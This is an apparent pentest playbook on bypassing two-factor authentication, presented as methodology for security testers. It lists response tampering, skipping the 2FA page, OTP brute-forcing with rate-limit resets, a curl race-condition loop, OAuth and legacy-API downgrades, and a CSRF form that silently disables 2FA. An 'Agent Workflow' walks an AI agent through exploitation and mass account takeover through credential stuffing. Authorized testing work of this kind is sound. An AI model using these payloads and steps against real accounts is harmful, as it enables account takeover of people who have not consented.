# 2FA / MFA Bypass

> **Summary**: Two-factor authentication bypass techniques exploit implementation flaws in the 2FA verification process, allowing attackers to circumvent the second authentication factor entirely.
> **Impact**: Complete authentication bypass, account takeover without possessing the second factor, access to protected accounts.
> **Typical Severity**: High | Critical

## Detection

### Indicators
- Identify the 2FA implementation type:
  - **TOTP**: time-based one-time password (Google Authenticator, Authy)
  - **SMS**: code sent via text message
  - **Email**: code sent to registered email
  - **Push notification**: approve/deny prompt on mobile app
  - **Backup codes**: static recovery codes
- Check for rate limiting on code submission endpoints
- Observe response structure when submitting valid vs invalid codes
- Check if 2FA state is tied to session or to a separate token
- Inspect whether 2FA can be disabled without re-authentication

### Automated Detection
- Use Burp Suite Intruder to test rate limiting on the OTP submission endpoint
- Use Burp macros to automate session handling through the 2FA flow
- Monitor response differences (status codes, body content, headers) between valid and invalid codes

### Manual Detection
1. Submit a valid 2FA code and capture the full response (status code, headers, body)
2. Submit an invalid code and compare the response
3. Try accessing authenticated pages directly after the first authentication factor
4. Check if the 2FA verification endpoint has rate limiting
5. Inspect cookies and tokens set after the first factor but before 2FA completion

## Exploitation

### Prerequisites
- Valid first-factor credentials (username + password)
- Access to the 2FA verification flow
- A proxy tool (Burp Suite) to intercept and modify requests/responses

### Step-by-Step

#### 1. Response Manipulation
Intercept the response to an invalid 2FA code and modify it:
```
# Original response to wrong code
HTTP/1.1 401 Unauthorized
{"success": false, "message": "Invalid code"}

# Modified response
HTTP/1.1 200 OK
{"success": true, "message": "Valid code"}
```
- Change status code: `401` / `403` to `200`
- Change boolean values: `false` to `true`
- Change error messages to success messages
- Remove error fields entirely from JSON response

#### 2. Direct Navigation (Skip 2FA)
After completing the first authentication factor, navigate directly to authenticated endpoints:
```
# Normal flow
POST /login -> 302 /2fa-verify -> 302 /dashboard

# Bypass: skip the 2FA page entirely
POST /login -> manually navigate to /dashboard
POST /login -> manually navigate to /api/user/profile
POST /login -> manually navigate to /account/settings
```
Also try altering the **Referrer header** to mimic navigation from the 2FA page.

#### 3. Code Reuse
Submit a previously valid 2FA code:
- Use a code that was valid in a previous session
- Use a code from your own account on a different account
- Check if codes are bound to the session or globally valid

#### 4. Null / Default Code Values
```
# Try null or zero values
000000
null
""
0
```

#### 5. Brute-Force (No Rate Limiting)
```
# 4-digit code: 10,000 combinations
# 6-digit code: 1,000,000 combinations

# Burp Intruder: Sniper attack on the code parameter
# Payload: Numbers, from 000000 to 999999, zero-padded
```
Check: even if a rate limit triggers (401 after N attempts), send the valid code anyway. Some implementations still return 200 for the correct code even after rate limiting kicks in.

#### 6. Rate Limit Reset via Code Resend
```
# 1. Send 3-5 invalid codes (approach rate limit)
# 2. Trigger "Resend Code" endpoint
# 3. Rate limit counter resets
# 4. Continue brute-forcing
# Repeat until code is found
```

#### 7. Session Fixation Before 2FA
```
# 1. Authenticate with attacker credentials (complete first factor)
# 2. Pause at the 2FA step
# 3. Note the session token
# 4. Initiate session for victim account
# 5. Complete 2FA on attacker account
# 6. Use the session to access the next step in victim's flow
```

#### 8. CSRF on 2FA Disable
```html
<!-- Host this on attacker-controlled page -->
<form action="https://target.com/account/2fa/disable" method="POST">
  <input type="hidden" name="confirm" value="true">
</form>
<script>document.forms[0].submit();</script>
```
Also check for **Clickjacking** on the 2FA disable page.

#### 9. Race Condition on Code Validation
Send multiple concurrent requests with different codes simultaneously:
```bash
# Using curl with parallel execution
for code in 123456 234567 345678 456789; do
  curl -s -X POST https://target.com/2fa/verify \
    -H "Cookie: session=abc123" \
    -d "code=$code" &
done
wait
```
Or use Burp Turbo Intruder for precise race condition timing.

#### 10. Password Reset Disabling 2FA
```
# 1. Enable 2FA on account
# 2. Request password reset
# 3. Reset password via the link
# 4. Log in with new password
# 5. Check if 2FA is still required (often it is not)
```

#### 11. Backup Code Brute-Force
Backup codes are typically 8-character alphanumeric strings, but some implementations use short numeric codes:
```
# If backup codes are numeric and short (e.g., 8 digits)
# Brute-force via Intruder with numeric payloads
# If alphanumeric, check if they follow a predictable pattern
```

#### 12. OAuth / SSO Bypass
- If the app supports OAuth login (Google, Facebook), try authenticating through OAuth -- many implementations skip 2FA for SSO users
- Check if linking a new OAuth provider bypasses 2FA

#### 13. Older API Versions
```
# Modern endpoint with 2FA
POST /v3/auth/login -> requires 2FA

# Try older API versions
POST /v2/auth/login -> may skip 2FA
POST /v1/auth/login -> may skip 2FA
```

#### 14. Subdomain Testing
- Test subdomains that may use outdated authentication without 2FA enforcement
- Try `staging.target.com`, `dev.target.com`, `api-legacy.target.com`

#### 15. OpenID acr_values Manipulation
The `acr_values` parameter in OpenID Connect requests can be manipulated to downgrade authentication requirements:
```
# Request with 2FA requirement
GET /authorize?acr_values=urn:mace:incommon:iap:silver

# Manipulated request (remove or downgrade)
GET /authorize?acr_values=urn:mace:incommon:iap:bronze
GET /authorize?acr_values=
```

### Payloads
```
# OTP bypass values to try
000000
111111
999999
null
""
0
true
[]
{"code": "000000"}
```

### Proof of Concept
```
# 1. Login with valid credentials
POST /login
{"username": "victim", "password": "pass123"}
# Response: 302 -> /2fa/verify, Set-Cookie: session=abc123

# 2. Skip 2FA, go directly to dashboard
GET /dashboard
Cookie: session=abc123
# If 200 OK with dashboard content -> 2FA bypassed
```

## Bypasses
- **Response manipulation**: intercept and change 401/403 to 200, false to true
- **Direct endpoint access**: navigate past the 2FA page to authenticated routes
- **Referrer header spoofing**: set Referer to the 2FA verification URL
- **IP-based trust**: use `X-Forwarded-For` header to impersonate victim's IP (bypass "remember this device")
- **Predictable cookie**: guess or manipulate the "remember me" cookie value
- **Code from response**: check if the OTP is leaked in the response body, headers, or JavaScript
- **Email verification link**: use the email verification link sent at account creation to access the profile without 2FA
- **Previous sessions**: enabling 2FA may not invalidate already active sessions
- **Timestamp-based OTP**: if OTP generation is based on predictable timestamps, generate the code locally

## Escalation
- Chain with [Rate Limit Bypass](../vulns/rate-limit-bypass.md) to enable brute-force of OTP codes
- Chain with **CSRF** to disable 2FA on victim accounts
- Chain with **Clickjacking** on the 2FA disable page
- Chain with **CORS misconfiguration** or **XSS** to steal backup codes at generation time
- Full account takeover when 2FA is the only barrier and the first factor is compromised

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite Intruder | Brute-force OTP codes with payloads 000000-999999 |
| Burp Suite Macros | Automate session handling through multi-step 2FA flows |
| Burp Turbo Intruder | Race condition testing with precise timing on code validation |
| Burp Match & Replace | Automatically modify response codes and body content |
| Custom Intruder Payloads | Numeric sequential payloads for backup code brute-force |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for 2FA bypass vulnerabilities.

### Phase 1: Discovery
1. Identify the 2FA implementation type on `<TARGET>`:
   - **TOTP**: time-based one-time password (Google Authenticator, Authy) -- typically 6-digit numeric
   - **SMS**: code sent via text message -- check code length and format
   - **Email**: code sent to registered email -- check code length and format
   - **Push notification**: approve/deny prompt on mobile app
   - **Backup codes**: static recovery codes -- check format (numeric, alphanumeric, length)
2. Complete the first authentication factor (username + password) and pause at the 2FA step
3. Capture the 2FA verification request in Burp: note the endpoint, parameters, session cookies
4. Submit a valid 2FA code and capture the full response (status code, headers, body, cookies set)
5. Submit an invalid 2FA code and capture the full response for comparison
6. Check for rate limiting on the code submission endpoint: send 10-20 invalid codes rapidly

### Phase 2: Validation
1. **Response manipulation test**: Submit an invalid code, intercept the response, and modify it:
   - Change HTTP status from `401`/`403` to `200`
   - Change `"success": false` to `"success": true`
   - Remove error fields from JSON body
   - Check if the client-side accepts the manipulated response and grants access
2. **Code reuse test**: Submit a previously valid 2FA code from a prior session
3. **Brute-force feasibility**: Determine code length and character set, calculate keyspace:
   - 4-digit numeric: 10,000 combinations
   - 6-digit numeric: 1,000,000 combinations
   - Check if rate limiting blocks attempts and whether the correct code still returns 200 even after rate limit
4. **Race condition test**: Send multiple concurrent requests with different codes using Turbo Intruder
5. **Direct navigation test**: After first factor, navigate directly to `/dashboard`, `/api/user/profile`, or other authenticated endpoints -- check if 2FA is enforced server-side

### Phase 3: Exploitation
1. **Response manipulation bypass**: If validation confirmed the client trusts the response:
   - Set up Burp Match & Replace rule: replace `"success":false` with `"success":true` on the 2FA endpoint
   - Complete the flow with any invalid code
2. **Direct endpoint access**: After first factor authentication, bypass the 2FA page:
   ```
   POST /login → get session cookie → GET /dashboard directly (skip /2fa/verify)
   ```
3. **Brute-force OTP** (if no effective rate limiting):
   ```
   Use Burp Intruder: Sniper attack on the code parameter
   Payload: Numbers 000000 to 999999, zero-padded
   ```
4. **Rate limit reset via code resend**: Send a few invalid codes, trigger "Resend Code", check if rate limit counter resets, then continue brute-forcing
5. **OAuth/SSO bypass**: If the app supports OAuth login (Google, Facebook), authenticate through OAuth -- many implementations skip 2FA for SSO users
6. **Backup code brute-force**: If backup codes are short numeric codes, brute-force them via Intruder
7. **Older API version bypass**: Try `POST /v1/auth/login` or `POST /v2/auth/login` which may not enforce 2FA
8. **Password reset disabling 2FA**: Request a password reset, reset the password, and check if 2FA is still required after logging in with the new password

### Phase 4: Escalation
1. Full account takeover: once 2FA is bypassed, access all account functionality
2. Chain with credential stuffing: use compromised first-factor credentials + 2FA bypass for mass account takeover
3. Chain with CSRF to disable 2FA on victim accounts:
   ```html
   <form action="https://<TARGET>/account/2fa/disable" method="POST"><input type="hidden" name="confirm" value="true"></form><script>document.forms[0].submit();</script>
   ```
4. Chain with Clickjacking on the 2FA disable page to trick users into disabling their own 2FA
5. Test if enabling 2FA invalidates existing sessions -- if not, pre-existing sessions remain vulnerable

## Decision Tree

```
2FA Step Reached
├── Response manipulation
│   └── Change 401→200, false→true → access granted? → BYPASS
├── Direct endpoint access (skip 2FA page)
│   └── GET /dashboard with session cookie → 200? → BYPASS
├── Code reuse from previous session
│   └── Old code accepted? → BYPASS
├── Brute-force OTP
│   ├── Rate limited? → Try rate limit reset via "Resend Code"
│   ├── Rate limited? → Try X-Forwarded-For IP rotation
│   ├── Rate limited? → Check if correct code still returns 200 during block
│   └── No rate limit? → Brute-force 000000-999999
├── Race condition (concurrent code submissions)
│   └── Multiple codes accepted simultaneously? → BYPASS
├── OAuth/SSO login flow
│   └── 2FA skipped for SSO users? → BYPASS
├── Older API version
│   └── /v1/ or /v2/ login skips 2FA? → BYPASS
├── Password reset
│   └── After reset, 2FA no longer required? → BYPASS
└── Backup codes
    └── Short/predictable? → Brute-force
```

## Success Criteria
- [ ] Accessed authenticated endpoints without providing a valid 2FA code
- [ ] Response manipulation caused the client to accept an invalid code
- [ ] Brute-forced the correct OTP code within the validity window
- [ ] OAuth/SSO flow bypassed the 2FA requirement entirely
- [ ] Full account access achieved, demonstrating complete 2FA bypass

## References
- [PortSwigger - 2FA Bypass Techniques](https://portswigger.net/web-security/authentication/multi-factor)
- [OWASP - Testing for Weak Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/)
- [Bypassing 2FA Using OpenID Misconfiguration](https://youst.in/posts/bypassing-2fa-using-openid-misconfiguration/)
- [Two Factor Authentication Security Testing and Possible Bypasses](https://medium.com/@iSecMax/two-factor-authentication-security-testing-and-possible-bypasses-f65650412b35)
- [2FA Bypass Techniques - Azwi](https://azwi.medium.com/2-factor-authentication-bypass-3b2bbd907718)
- [The 2,200 ATO Most Bug Hunters Overlooked](https://mokhansec.medium.com/the-2-200-ato-most-bug-hunters-overlooked-by-closing-intruder-too-soon-505f21d56732)
